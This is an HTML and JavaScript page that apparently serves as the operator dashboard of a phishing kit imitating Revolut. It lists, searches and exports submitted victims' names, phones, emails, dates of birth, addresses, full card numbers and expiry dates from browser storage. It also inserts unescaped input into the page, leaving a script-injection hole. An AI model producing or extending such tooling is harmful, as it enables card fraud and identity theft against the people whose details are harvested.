<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Admin Dashboard - Revolut Data</title>
    <link href='https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap' rel='stylesheet'>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0A0A0A; color: #fff; padding: 20px; }

        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: linear-gradient(135deg, #0075EB, #8B5CF6); border-radius: 16px; }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header p { opacity: 0.8; font-size: 14px; }

        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; text-align: center; }
        .stat-card h3 { font-size: 32px; color: #00D4AA; margin-bottom: 5px; }
        .stat-card p { color: #9ca3af; font-size: 14px; }

        .controls { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .btn { padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; font-size: 14px; transition: all 0.3s; }
        .btn-primary { background: linear-gradient(135deg, #0075EB, #8B5CF6); color: #fff; }
        .btn-danger { background: #ef4444; color: #fff; }
        .btn-success { background: #00D4AA; color: #000; }
        .btn:hover { opacity: 0.9; transform: translateY(-1px); }

        input, select { padding: 10px 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.15); background: rgba(255,255,255,0.08); color: #fff; font-size: 14px; }
        input::placeholder { color: rgba(255,255,255,0.3); }

        .table-container { overflow-x: auto; background: rgba(255,255,255,0.03); border-radius: 16px; border: 1px solid rgba(255,255,255,0.1); }
        table { width: 100%; border-collapse: collapse; }
        th { background: rgba(255,255,255,0.08); padding: 15px; text-align: left; font-size: 13px; font-weight: 600; color: #9ca3af; text-transform: uppercase; letter-spacing: 0.5px; }
        td { padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 14px; }
        tr:hover { background: rgba(255,255,255,0.03); }

        .badge { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
        .badge-visa { background: rgba(0,117,235,0.2); color: #0075EB; }
        .badge-master { background: rgba(255,215,0,0.2); color: #ffd700; }

        .empty { text-align: center; padding: 60px 20px; color: #9ca3af; }
        .empty-icon { font-size: 48px; margin-bottom: 15px; }

        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        .modal.active { display: flex; }
        .modal-box { background: #1a1a2e; border: 1px solid rgba(255,255,255,0.15); border-radius: 20px; padding: 30px; max-width: 500px; width: 100%; max-height: 80vh; overflow-y: auto; }
        .modal-box h3 { margin-bottom: 20px; font-size: 20px; }
        .detail-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .detail-row:last-child { border-bottom: none; }
        .detail-label { color: #9ca3af; font-size: 14px; }
        .detail-value { font-weight: 600; font-size: 14px; }

        @media (max-width: 768px) {
            .stats { grid-template-columns: 1fr; }
            .controls { flex-direction: column; }
            table { font-size: 12px; }
            th, td { padding: 10px 8px; }
        }
    </style>
<base target="_blank">
</head>
<body>
    <div class='header'>
        <h1>📊 Revolut Data Dashboard</h1>
        <p>View and manage all submitted applications</p>
    </div>

    <div class='stats'>
        <div class='stat-card'>
            <h3 id='total-count'>0</h3>
            <p>Total Applications</p>
        </div>
        <div class='stat-card'>
            <h3 id='visa-count'>0</h3>
            <p>Visa Cards</p>
        </div>
        <div class='stat-card'>
            <h3 id='master-count'>0</h3>
            <p>Mastercard</p>
        </div>
        <div class='stat-card'>
            <h3 id='today-count'>0</h3>
            <p>Today</p>
        </div>
    </div>

    <div class='controls'>
        <input type='text' id='search-input' placeholder='🔍 Search by name, email, phone...' oninput='searchData()'>
        <select id='filter-type' onchange='filterData()'>
            <option value='all'>All Cards</option>
            <option value='VISA'>Visa Only</option>
            <option value='MASTERCARD'>Mastercard Only</option>
        </select>
        <button class='btn btn-success' onclick='exportData()'>📥 Export JSON</button>
        <button class='btn btn-danger' onclick='clearAllData()'>🗑️ Clear All</button>
    </div>

    <div class='table-container'>
        <table id='data-table'>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Name</th>
                    <th>Phone</th>
                    <th>Email</th>
                    <th>Card</th>
                    <th>Type</th>
                    <th>Date</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id='table-body'>
            </tbody>
        </table>
        <div id='empty-state' class='empty' style='display:none;'>
            <div class='empty-icon'>📭</div>
            <h3>No Data Found</h3>
            <p>Submit some applications to see them here</p>
        </div>
    </div>

    <div class='modal' id='detail-modal'>
        <div class='modal-box'>
            <h3>📋 Application Details</h3>
            <div id='modal-content'></div>
            <div style='text-align:center; margin-top:20px;'>
                <button class='btn btn-primary' onclick='closeModal()'>Close</button>
            </div>
        </div>
    </div>

    <script>
        // Load data from localStorage
        function loadData() {
            var data = JSON.parse(localStorage.getItem('revolutData') || '[]');
            return data.reverse(); // Newest first
        }

        function renderTable(data) {
            var tbody = document.getElementById('table-body');
            var emptyState = document.getElementById('empty-state');

            if(data.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                updateStats(data);
                return;
            }

            emptyState.style.display = 'none';

            var html = '';
            data.forEach(function(item, index) {
                var cardLast4 = item.card_number ? item.card_number.replace(/\s/g, '').slice(-4) : '****';
                var date = new Date(item.timestamp).toLocaleDateString();
                var time = new Date(item.timestamp).toLocaleTimeString();
                var badgeClass = item.card_type === 'VISA' ? 'badge-visa' : 'badge-master';

                html += '<tr>';
                html += '<td>' + (index + 1) + '</td>';
                html += '<td>' + (item.full_name || '-') + '</td>';
                html += '<td>' + (item.country_code || '') + ' ' + (item.phone || '-') + '</td>';
                html += '<td>' + (item.email || '-') + '</td>';
                html += '<td>**** **** **** ' + cardLast4 + '</td>';
                html += '<td><span class="badge ' + badgeClass + '">' + (item.card_type || '-') + '</span></td>';
                html += '<td>' + date + '<br><small style="color:#9ca3af">' + time + '</small></td>';
                html += '<td>';
                html += '<button class="btn btn-primary" style="padding:6px 12px; font-size:12px;" onclick="viewDetails(' + index + ')">View</button> ';
                html += '<button class="btn btn-danger" style="padding:6px 12px; font-size:12px;" onclick="deleteEntry(' + index + ')">Delete</button>';
                html += '</td>';
                html += '</tr>';
            });

            tbody.innerHTML = html;
            updateStats(data);
        }

        function updateStats(data) {
            document.getElementById('total-count').textContent = data.length;
            document.getElementById('visa-count').textContent = data.filter(function(d) { return d.card_type === 'VISA'; }).length;
            document.getElementById('master-count').textContent = data.filter(function(d) { return d.card_type === 'MASTERCARD'; }).length;

            var today = new Date().toDateString();
            var todayCount = data.filter(function(d) { return new Date(d.timestamp).toDateString() === today; }).length;
            document.getElementById('today-count').textContent = todayCount;
        }

        function searchData() {
            var query = document.getElementById('search-input').value.toLowerCase();
            var allData = loadData();
            var filtered = allData.filter(function(item) {
                return (item.full_name || '').toLowerCase().includes(query) ||
                       (item.email || '').toLowerCase().includes(query) ||
                       (item.phone || '').includes(query) ||
                       (item.city || '').toLowerCase().includes(query);
            });
            renderTable(filtered);
        }

        function filterData() {
            var type = document.getElementById('filter-type').value;
            var allData = loadData();
            if(type === 'all') {
                renderTable(allData);
                return;
            }
            var filtered = allData.filter(function(item) { return item.card_type === type; });
            renderTable(filtered);
        }

        function viewDetails(index) {
            var data = loadData();
            var item = data[index];
            if(!item) return;

            var content = '';
            var fields = [
                ['Full Name', item.full_name],
                ['Phone', (item.country_code || '') + ' ' + (item.phone || '')],
                ['Email', item.email],
                ['Date of Birth', item.dob],
                ['Address', [item.flat, item.street, item.city, item.state, item.postal].filter(Boolean).join(', ')],
                ['Card Number', item.card_number],
                ['Card Expiry', item.card_expiry],
                ['Card CVC', '***'],
                ['Card Type', item.card_type],
                ['Submitted', new Date(item.timestamp).toLocaleString()]
            ];

            fields.forEach(function(field) {
                content += '<div class="detail-row"><span class="detail-label">' + field[0] + '</span><span class="detail-value">' + (field[1] || '-') + '</span></div>';
            });

            document.getElementById('modal-content').innerHTML = content;
            document.getElementById('detail-modal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('detail-modal').classList.remove('active');
        }

        function deleteEntry(index) {
            if(!confirm('Are you sure you want to delete this entry?')) return;
            var data = loadData();
            data.splice(index, 1);
            localStorage.setItem('revolutData', JSON.stringify(data.reverse()));
            renderTable(loadData());
        }

        function clearAllData() {
            if(!confirm('⚠️ WARNING: This will delete ALL data! Are you sure?')) return;
            localStorage.removeItem('revolutData');
            renderTable([]);
        }

        function exportData() {
            var data = localStorage.getItem('revolutData') || '[]';
            var blob = new Blob([data], {type: 'application/json'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'revolut_data_' + new Date().toISOString().slice(0,10) + '.json';
            a.click();
            URL.revokeObjectURL(url);
        }

        // Initial load
        renderTable(loadData());

        // Refresh every 5 seconds
        setInterval(function() {
            renderTable(loadData());
        }, 5000);
    </script>
</body>
</html>
